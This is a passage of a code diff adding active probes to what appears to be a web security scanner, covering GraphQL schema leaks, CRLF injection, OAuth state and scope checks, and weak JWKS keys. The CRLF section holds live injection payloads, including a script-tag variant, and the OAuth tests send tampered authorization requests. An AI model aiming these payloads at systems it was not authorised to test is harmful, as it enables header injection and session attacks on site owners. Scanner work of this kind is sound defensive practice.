+                        "evidence": (
+                            f"GraphQL endpoint returns field suggestions on typos, "
+                            f"enabling schema enumeration even with introspection disabled. "
+                            f"Response: {sugg_resp.text[:300]}"
+                        ),
+                        "remediation": (
+                            "Disable field suggestion in production to prevent "
+                            "schema enumeration. In Apollo: fieldSuggestion: false."
+                        ),
+                        "phase": "Active Baseline (GraphQL Suggestions)",
+                        "tool": "active_baseline.graphql_introspection_probe",
+                        "_finding_source": "active_baseline",
+                    }
+                    findings.append(sf)
+                    _emit(sf)
+            except Exception:
+                pass
+
+            break  # one host is enough for introspection
 
     _progress("active_baseline_end", {
         "probe": "graphql_introspection", "findings": len(findings),
@@ -2328,6 +2843,56 @@ async def run_http_smuggling_probe(
             findings.append(f)
             _emit(f)
 
+        # ── CRLF injection test ──
+        import hashlib as _hashlib_smug
+        crlf_canary = f"crlfcanary{_hashlib_smug.md5(host.encode()).hexdigest()[:6]}"
+        crlf_payloads = [
+            ("crlf_header_inject", f"/{crlf_canary}%0d%0aX-Injected:%20true"),
+            ("crlf_double", f"/%0d%0a%0d%0a<script>{crlf_canary}</script>"),
+            ("crlf_encoded", f"/%250d%250aX-Injected:%20{crlf_canary}"),
+        ]
+        for crlf_label, crlf_path in crlf_payloads:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            crlf_url = f"https://{host}{crlf_path}"
+            try:
+                crlf_resp = await http_client.get(
+                    crlf_url, timeout=10.0, follow_redirects=False,
+                    headers=_PROBE_HEADERS,
+                )
+                resp_headers = str(dict(crlf_resp.headers))
+                body = crlf_resp.text[:20_000]
+            except Exception:
+                continue
+
+            if "x-injected" in resp_headers.lower() or crlf_canary in body:
+                f = {
+                    "title": "CRLF Injection / HTTP Response Splitting",
+                    "severity": "High",
+                    "confidence": "High" if "x-injected" in resp_headers.lower() else "Medium",
+                    "owasp_category": "A03:2021",
+                    "cwe": "CWE-113",
+                    "url": crlf_url,
+                    "parameter": "URL path",
+                    "payload": crlf_path,
+                    "evidence": (
+                        f"CRLF injection via {crlf_label}: canary '{crlf_canary}' "
+                        f"appeared in {'response headers' if 'x-injected' in resp_headers.lower() else 'response body'}. "
+                        f"Status: {crlf_resp.status_code}."
+                    ),
+                    "remediation": (
+                        "Sanitize URL paths by stripping CR (\\r) and LF (\\n) "
+                        "characters. Use a WAF rule to block %0d%0a sequences."
+                    ),
+                    "phase": "Active Baseline (CRLF Injection)",
+                    "tool": "active_baseline.http_smuggling_probe",
+                    "_finding_source": "active_baseline",
+                    "_variant": "CRLF",
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
     _progress("active_baseline_end", {
         "probe": "http_smuggling", "findings": len(findings),
     })
@@ -2486,6 +3051,142 @@ async def run_oauth_oidc_probe(
                             }
                             findings.append(f)
                             _emit(f)
+                    except Exception:
+                        pass
+
+                # ── State parameter fixation test ──
+                if auth_endpoint:
+                    no_state_url = (
+                        f"{auth_endpoint}?response_type=code"
+                        f"&client_id=probe_test"
+                        f"&redirect_uri=https://example.com/callback"
+                        f"&scope=openid"
+                    )
+                    try:
+                        ns_resp = await http_client.get(
+                            no_state_url, timeout=10.0, follow_redirects=False,
+                            headers=_PROBE_HEADERS,
+                        )
+                        ns_location = str(ns_resp.headers.get("location", ""))
+                        if ns_resp.status_code in (301, 302, 303, 307, 308):
+                            if "state=" not in ns_location and "error" not in ns_location:
+                                sf = {
+                                    "title": "OAuth State Parameter Not Enforced (CSRF Risk)",
+                                    "severity": "Medium",
+                                    "confidence": "High",
+                                    "owasp_category": "A07:2021",
+                                    "cwe": "CWE-352",
+                                    "url": no_state_url,
+                                    "parameter": "state",
+                                    "payload": "Authorization request without state parameter",
+                                    "evidence": (
+                                        f"Authorization endpoint accepted request without "
+                                        f"'state' parameter and redirected to: {ns_location[:200]}. "
+                                        f"Missing state enables OAuth CSRF attacks."
+                                    ),
+                                    "remediation": (
+                                        "Require the 'state' parameter in all authorization "
+                                        "requests. Validate the state value on callback to "
+                                        "prevent CSRF."
+                                    ),
+                                    "phase": "Active Baseline (OAuth/OIDC)",
+                                    "tool": "active_baseline.oauth_oidc_probe",
+                                    "_finding_source": "active_baseline",
+                                }
+                                findings.append(sf)
+                                _emit(sf)
+                    except Exception:
+                        pass
+
+                # ── Scope escalation test ──
+                scopes_supported = config.get("scopes_supported", [])
+                if scopes_supported and auth_endpoint:
+                    all_scopes = " ".join(scopes_supported)
+                    scope_url = (
+                        f"{auth_endpoint}?response_type=code"
+                        f"&client_id=probe_test"
+                        f"&redirect_uri=https://example.com/callback"
+                        f"&scope={all_scopes}"
+                        f"&state=probe_state"
+                    )
+                    try:
+                        sc_resp = await http_client.get(
+                            scope_url, timeout=10.0, follow_redirects=False,
+                            headers=_PROBE_HEADERS,
+                        )
+                        sc_location = str(sc_resp.headers.get("location", ""))
+                        if sc_resp.status_code in (301, 302, 303, 307, 308) and "error" not in sc_location:
+                            sef = {
+                                "title": "OAuth Scope Escalation Possible",
+                                "severity": "Medium",
+                                "confidence": "Medium",
+                                "owasp_category": "A01:2021",
+                                "cwe": "CWE-269",
+                                "url": scope_url,
+                                "parameter": "scope",
+                                "payload": all_scopes,
+                                "evidence": (
+                                    f"Authorization endpoint accepted all "
+                                    f"{len(scopes_supported)} scopes without "
+                                    f"rejection: {all_scopes[:200]}. "
+                                    f"Redirect: {sc_location[:200]}"
+                                ),
+                                "remediation": (
+                                    "Validate requested scopes against per-client "
+                                    "allowlists. Reject scope combinations that "
+                                    "exceed the client's authorized access level."
+                                ),
+                                "phase": "Active Baseline (OAuth/OIDC)",
+                                "tool": "active_baseline.oauth_oidc_probe",
+                                "_finding_source": "active_baseline",
+                            }
+                            findings.append(sef)
+                            _emit(sef)
+                    except Exception:
+                        pass
+
+                # ── JWKS endpoint exposure check ──
+                jwks_uri = config.get("jwks_uri", "")
+                if jwks_uri:
+                    try:
+                        import json as _json_jwk
+                        jwk_resp = await http_client.get(
+                            jwks_uri, timeout=10.0, follow_redirects=True,
+                            headers=_PROBE_HEADERS,
+                        )
+                        if jwk_resp.status_code == 200:
+                            jwk_data = _json_jwk.loads(jwk_resp.text[:20_000])
+                            keys = jwk_data.get("keys", [])
+                            weak_keys = [
+                                k for k in keys
+                                if k.get("kty") == "RSA" and
+                                len(k.get("n", "")) < 340
+                            ]
+                            if weak_keys:
+                                jf = {
+                                    "title": "Weak RSA Key in JWKS",
+                                    "severity": "High",
+                                    "confidence": "High",
+                                    "owasp_category": "A02:2021",
+                                    "cwe": "CWE-326",
+                                    "url": jwks_uri,
+                                    "parameter": "jwks_uri",
+                                    "payload": f"GET {jwks_uri}",
+                                    "evidence": (
+                                        f"JWKS at {jwks_uri} contains "
+                                        f"{len(weak_keys)} RSA key(s) with "
+                                        f"modulus < 2048 bits."
+                                    ),
+                                    "remediation": (
+                                        "Use RSA keys with at least 2048-bit "
+                                        "modulus. Rotate any weak keys."
+                                    ),
+                                    "phase": "Active Baseline (OAuth/OIDC)",
+                                    "tool": "active_baseline.oauth_oidc_probe",
+                                    "_finding_source": "active_baseline",
+                                }
+                                findings.append(jf)
+                                _emit(jf)
                     except Exception:
                         pass
 
